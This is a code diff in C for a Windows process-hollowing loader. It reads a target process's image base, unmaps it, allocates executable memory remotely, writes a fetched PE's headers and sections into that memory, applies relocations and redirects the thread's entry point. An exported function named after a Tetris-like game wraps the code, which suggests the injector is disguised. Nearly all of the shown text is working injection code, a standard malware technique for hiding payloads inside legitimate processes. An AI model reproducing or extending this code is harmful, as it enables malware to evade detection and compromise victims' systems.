@@ -68,7 +68,6 @@ BYTE* fetchPE(){
         sz, 
         &cycleRead
     ) && cycleRead>0){
-        printf("fetching PE to heap\n");
         totalRead+=cycleRead;
         void*tmp=realloc(pe,totalRead+sz);
         if(tmp)
@@ -108,7 +107,7 @@ MappingMetadata PEParser(BYTE* pe){
 }
 
 // section object mappnig approach
-// void mapRoutine(){
+// void mapRoutineY(){
 // HANDLE pe_headers_section;
 // NtCreateSection(
 // &pe_headers_section,
@@ -156,6 +155,44 @@ MappingMetadata PEParser(BYTE* pe){
 // }
 // }
 
+void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
+    IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
+    unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
+
+    for(int i=0; i<mm.ImageSectionsCount; i++){
+    char* name=(char*)(sec->Name);
+    if(strcmp(name,".reloc")==0){
+        *reloc=sec;
+        continue;
+    }
+
+    unsigned int protections=sec->Characteristics;
+    unsigned int rva_raw=sec->PointerToRawData;
+    unsigned int rva_virt=sec->VirtualAddress;
+    unsigned int secSz=sec->SizeOfRawData;
+
+    void* va=remoteV+rva_virt;
+    void* raw=mm.heapBase+rva_raw;
+    unsigned long long written=0;
+
+    WriteProcessMemory(
+        proc,
+        va,
+        raw,
+        secSz,
+        &written
+    );
+    printf("written to %s --- %llu bytes\n",name,written);
+    if(written!=(unsigned long)secSz){
+        printf("[-] 235!\n");
+        exit(1);
+    }
+    sec++;
+    }
+}
+
+
+// BUG IS WITHIN rellocate() SOMEWHERE
 
 void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBase,IMAGE_SECTION_HEADER *sec){
     BYTE* relocBlockHeapVIew=(BYTE*)(heapBase+(unsigned int)(sec->PointerToRawData));
@@ -223,11 +260,15 @@ if(NtQueryInformationProcess(
 }
 // stores address of PEB. only makes sense within VA space of remote process. not here
 void* baseAddrAddr=(void*)((BYTE*)pinfo.PebBaseAddress+0x10);
-void* baseAddr=NULL;
-ReadProcessMemory(proc,baseAddrAddr,baseAddr,sizeof(PVOID),NULL);
-NtUnmapViewOfSection(proc,baseAddr); // disassociates VA region from section object
+uintptr_t baseAddr=0;
+ReadProcessMemory(proc,baseAddrAddr,&baseAddr,sizeof(PVOID),NULL);
+NtUnmapViewOfSection(proc,(void*)baseAddr); // disassociates VA region from section object
 
 MappingMetadata mm=PEParser(pe);
+printf(
+    "heap base: %llu | prefered base: %llu | image size: %lu | headers size: %lu\n",
+    mm.heapBase,mm.preferedBase,mm.imageSize,mm.headersSize
+);
 
 char* remoteV=(char*)VirtualAllocEx(
 proc,
@@ -237,52 +278,26 @@ MEM_COMMIT | MEM_RESERVE,
 0x40
 );
 
-WriteProcessMemory(
+if(WriteProcessMemory(
     proc,
     remoteV,
     mm.heapBase,
     mm.headersSize,
     NULL
-);
+)){
+    printf("up to 246. alles gut\n");
 
-// sec -> heap
-IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
-unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
+};
 
 IMAGE_SECTION_HEADER *reloc=NULL;
-
-for(int i=0; i<mm.ImageSectionsCount; i++){
-char* name=(char*)(sec->Name);
-if(strcmp(name,".reloc")==0){
-    reloc=sec;
-    continue;
-}
-unsigned int protections=sec->Characteristics;
-unsigned int rva_raw=sec->PointerToRawData;
-unsigned int rva_virt=sec->VirtualAddress;
-unsigned int secSz=sec->SizeOfRawData;
-void* va=remoteV+rva_virt;
-void* raw=mm.heapBase+rva_virt;
-unsigned long long written=0;
-WriteProcessMemory(
-    proc,
-    va,
-    raw,
-    secSz,
-    &written
-);
-if(written!=(unsigned long)secSz){
-    printf("[-] 235!\n");
-    exit(1);
-}
-sec++;
-}
+mapRoutineX(proc,remoteV,mm,&reloc); // or mapRoutineY();
 
 if(mm.preferedBase!=(unsigned long long)remoteV)
     rellocate(proc,(void*)remoteV,(void*)mm.heapBase,(void*)mm.preferedBase,reloc);
 
 
 uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
+printf("ENTRY POINT: %llu\n",entryPont);
 CONTEXT thContext;
 if(!GetThreadContext(thread,&thContext))
     printf("[-] 288!\n");
@@ -306,7 +321,7 @@ bool __0x1FN3C3SS4RY__(){
         return true;
     exit(1);
 }
-bool initializeTetrix(){
+extern bool initializeTetrix(){
   return __0x1FN3C3SS4RY__();
 }
 
